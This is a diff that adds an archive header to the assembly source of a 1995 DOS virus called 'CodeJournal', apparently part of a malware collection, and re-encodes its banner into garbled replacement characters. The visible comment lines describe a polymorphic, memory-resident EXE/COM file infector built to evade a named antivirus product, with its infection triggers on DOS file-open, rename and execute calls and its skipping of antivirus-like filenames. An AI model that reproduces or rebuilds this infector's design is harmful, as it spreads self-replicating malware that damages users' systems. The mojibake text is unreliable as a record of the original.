@@ -1,7 +1,18 @@
+; ------------------------------------------------------------
+; name      C
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
-; CodeJournal virus, (c)1995 ûirogen [NuKE]
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+; CodeJournal virus, (c)1995 ï¿½irogen [NuKE]
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;
 ; Polymorphic, Resident, Parastic EXE/COM Fast Infector. This is
 ; another one of my fuck-Invircible viruses. It uses absolutly
@@ -17,7 +28,7 @@
 ;
 ; The Rest
 ; ----------------------
-;  Polymorphism is ûiCE v0.5
+;  Polymorphism is ï¿½iCE v0.5
 ;  Infects on: Open (3Dh), Rename (56h), Ext. Open (6Ch), Execute (4Bh)
 ;  Doesn't infect executables ending in 'AN', 'OT', 'AV', 'NU', or 'ND'.
 ;  Attempts to get DOS 21h vector by assuming offset is 109Eh in DOS seg.
@@ -562,7 +573,7 @@ new_24:                                     ; critical error handler
 
 
 inv_spec    db      '*.*',0
-credits     db      'CodeJournal by ûirogen [NuKE]'
+credits     db      'CodeJournal by ï¿½irogen [NuKE]'
 orgss       dw      0                       ; original SS:SP in exe
 orgsp       dw      0                       ;
 fix_mem     db      0
